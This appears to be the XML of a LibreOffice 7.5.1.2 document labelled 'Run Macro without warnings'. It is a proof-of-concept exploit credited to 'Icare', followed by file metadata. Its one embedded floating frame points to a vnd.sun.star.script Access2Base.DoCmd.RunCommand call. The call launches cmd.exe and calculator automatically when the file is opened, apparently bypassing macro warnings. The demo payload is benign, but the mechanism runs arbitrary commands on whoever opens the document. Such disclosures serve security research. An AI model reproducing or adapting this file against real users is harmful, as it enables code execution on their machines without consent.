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frame-display-border="tru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OC-LibreOffice 7 .5.1.2 </text:p>
      <text:p text:style-name="Standard">March 2023</text:p>
      <text:p text:style-name="Standard">Icare</text:p>
      <text:p text:style-name="Standard">Icare (@Icare1337) / Twitter </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Run Macro without warnings </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="char" svg:width="9.999cm" svg:height="9.999cm" draw:z-index="0"><draw:floating-frame xlink:href="vnd.sun.star.script:Access2Base.DoCmd.RunCommand(&quot;c:/windows/system32/cmd.exe&quot;,&quot;/c%20start %20/min%20calc.exe&quot;)?language=Basic&amp;location=application" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:frame-name="Run Macro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6T11:30:57.968000000</meta:creation-date>
    <dc:date>2023-03-26T11:32:26.003000000</dc:date>
    <meta:editing-duration>PT1M28S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="1" meta:page-count="1" meta:paragraph-count="5" meta:word-count="14" meta:character-count="96" meta:non-whitespace-character-count="84"/>
    <meta:generator>LibreOffice/7.5.1.2$Windows_X86_64 LibreOffice_project/fcbaee479e84c6cd81291587d2ee68cba099e129</meta:generator>
  </office:meta>
</office:document-meta>
</file>